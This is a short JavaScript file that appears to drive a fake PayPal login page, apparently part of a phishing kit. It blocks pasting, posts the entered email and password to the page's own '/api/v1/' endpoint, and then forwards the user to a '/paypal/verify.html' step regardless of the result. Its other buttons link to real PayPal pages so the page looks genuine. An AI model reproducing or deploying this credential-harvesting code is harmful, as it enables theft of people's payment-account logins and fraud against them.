const email = document.getElementById("email");
const password = document.getElementById("password");
const loginBtn = document.getElementById("login");
const signUpBtn = document.getElementById("signup");
const forgetBtn = document.getElementById("forget");

window.onload = () => {
    email.onpaste = e => e.preventDefault();
    password.onpaste = e => e.preventDefault();
}

async function postCredentials(email, password) {
    try {
        const r = await fetch("/api/v1/", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, password })
        });

        const result = await r.json();
        console.log("SERVER RESPONSE:", result);
        return result;
    } catch (err) {
        console.log("error", err);
    }
}

loginBtn.addEventListener("click", async function() {
    const res = await postCredentials(email.value, password.value);
    window.location.href = "/paypal/verify.html";
});


forgetBtn.addEventListener("click", function() {
    window.location.replace("https://www.paypal.com/authflow/password-recovery/");
});

signUpBtn.addEventListener("click", function() {
    window.location.replace("https://www.paypal.com/us/webapps/mpp/account-selection/");
});